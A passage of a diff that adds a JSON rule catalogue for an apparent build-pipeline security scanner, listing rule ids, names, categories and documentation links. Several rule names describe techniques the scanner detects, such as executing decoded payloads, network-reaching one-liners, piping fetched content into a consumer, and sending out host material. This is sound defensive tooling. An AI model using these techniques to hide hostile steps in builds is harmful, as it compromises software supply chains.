+    "id": "U003",
+    "name": "New Remote Source In Manifest",
+    "severity": "MEDIUM",
+    "categoryTitle": "Upstream Manifests",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/upstream-manifests/#u003"
+  },
+  "u004": {
+    "id": "U004",
+    "name": "Registry Redirect",
+    "severity": "MEDIUM",
+    "categoryTitle": "Upstream Manifests",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/upstream-manifests/#u004"
+  },
+  "u005": {
+    "id": "U005",
+    "name": "Dependency Surface Jump",
+    "severity": "INFO",
+    "categoryTitle": "Upstream Manifests",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/upstream-manifests/#u005"
+  },
+  "u006": {
+    "id": "U006",
+    "name": "Manifest Changed Without Its Lockfile",
+    "severity": "INFO",
+    "categoryTitle": "Upstream Manifests",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/upstream-manifests/#u006"
+  },
+  "w001": {
+    "id": "W001",
+    "name": "Executes Code This Analysis Did Not Read",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w001"
+  },
+  "w002": {
+    "id": "W002",
+    "name": "Build Resolves Dependencies From A Registry",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w002"
+  },
+  "w003": {
+    "id": "W003",
+    "name": "Applies A Patch This Analysis Did Not Read",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w003"
+  },
+  "w004": {
+    "id": "W004",
+    "name": "Build Engine Runs A Manifest This Analysis Did Not Read",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w004"
+  },
+  "w005": {
+    "id": "W005",
+    "name": "Build Runs A Target Whose Recipe Was Not Read",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w005"
+  },
+  "w006": {
+    "id": "W006",
+    "name": "Generated File Names A Build-Only Path",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w006"
+  },
+  "w007": {
+    "id": "W007",
+    "name": "Dependency Novelty Declined For Insufficient Observations",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w007"
+  },
+  "w008": {
+    "id": "W008",
+    "name": "Unresolved Construct In A Recipe",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w008"
+  },
+  "w009": {
+    "id": "W009",
+    "name": "Upstream Manifests Not Examined",
+    "severity": "",
+    "categoryTitle": "Unverifiable",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w009"
+  },
+  "x001": {
+    "id": "X001",
+    "name": "Encoded Payload Decoded And Executed",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x001"
+  },
+  "x002": {
+    "id": "X002",
+    "name": "Non-Literal Executable Name",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x002"
+  },
+  "x003": {
+    "id": "X003",
+    "name": "Obfuscated Command Argument",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x003"
+  },
+  "x004": {
+    "id": "X004",
+    "name": "Build Output Suppressed",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x004"
+  },
+  "x005": {
+    "id": "X005",
+    "name": "Home Reached By An Alternative Spelling",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x005"
+  },
+  "x006": {
+    "id": "X006",
+    "name": "Source Points Somewhere Unexpected",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x006"
+  },
+  "x007": {
+    "id": "X007",
+    "name": "Multiple Evasion Techniques",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x007"
+  },
+  "x008": {
+    "id": "X008",
+    "name": "Whitespace A Shell Does Not Split On",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x008"
+  },
+  "x009": {
+    "id": "X009",
+    "name": "Fetch Through An Uncatalogued Client",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x009"
+  },
+  "x010": {
+    "id": "X010",
+    "name": "Interpreter One-Liner Reaches The Network",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x010"
+  },
+  "x011": {
+    "id": "X011",
+    "name": "Package Manager Runs Fetched Code At Build Time",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x011"
+  },
+  "x012": {
+    "id": "X012",
+    "name": "Build Toolchain Redirected Into The Source Tree",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x012"
+  },
+  "x013": {
+    "id": "X013",
+    "name": "Fetch Redirected Or Trust Root Replaced",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x013"
+  },
+  "x014": {
+    "id": "X014",
+    "name": "Environment Variable Names Code To Run",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x014"
+  },
+  "x015": {
+    "id": "X015",
+    "name": "Work Scheduled To Run After The Build",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x015"
+  },
+  "x016": {
+    "id": "X016",
+    "name": "Fetch Piped Into An Unrecognised Consumer",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x016"
+  },
+  "x017": {
+    "id": "X017",
+    "name": "Tool Flag Or Builtin Carries A Command",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x017"
+  },
+  "x018": {
+    "id": "X018",
+    "name": "Interpreter One-Liner Assembles A Name",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x018"
+  },
+  "x019": {
+    "id": "X019",
+    "name": "Host Material Sent Or Packaged",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x019"
+  },
+  "x020": {
+    "id": "X020",
+    "name": "Recipe Writes The Build Steps The Engine Runs",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x020"
+  },
+  "x021": {
+    "id": "X021",
+    "name": "Executor Runs A File Chosen At Runtime",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x021"
+  },
+  "x022": {
+    "id": "X022",
+    "name": "Generated Config Handed To The Tool That Reads It",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x022"
+  },
+  "x023": {
+    "id": "X023",
+    "name": "Command Output Executed As A Script",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x023"
+  },
+  "x024": {
+    "id": "X024",
+    "name": "Indirect Sensitive Assignment",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x024"
+  },
+  "x025": {
+    "id": "X025",
+    "name": "Multi-Line Function Shadow",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x025"
+  },
+  "x026": {
+    "id": "X026",
+    "name": "Unresolved Constructs In Executable Positions",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x026"
+  },
+  "x027": {
+    "id": "X027",
+    "name": "Refusal Cluster",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x027"
+  },
+  "x028": {
+    "id": "X028",
+    "name": "Pattern Completed Across Commits",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x028"
+  },
+  "x029": {
+    "id": "X029",
+    "name": "Encoded Material At Rest",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x029"
+  },
+  "x030": {
+    "id": "X030",
+    "name": "ANSI-C Quoted Content In Commands",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x030"
+  },
+  "x031": {
+    "id": "X031",
+    "name": "Build Reads Non-Code Text",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x031"
+  },
+  "x032": {
+    "id": "X032",
+    "name": "Command Name Assembled By Splicing",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x032"
+  },
+  "x033": {
+    "id": "X033",
+    "name": "File With No Provenance Executed",
+    "severity": "",
+    "categoryTitle": "Crossfire",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/crossfire/#x033"
+  }
+}
